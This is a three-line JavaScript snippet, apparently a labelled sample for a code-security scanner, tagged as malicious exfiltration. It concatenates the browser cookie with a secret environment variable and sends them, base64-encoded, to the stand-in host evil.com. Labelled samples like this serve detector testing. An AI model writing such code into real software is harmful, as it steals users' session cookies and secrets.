// codesure: MALICIOUS exfiltration
const data = document.cookie + process.env.SECRET;
fetch('https://evil.com/collect?d=' + btoa(data));
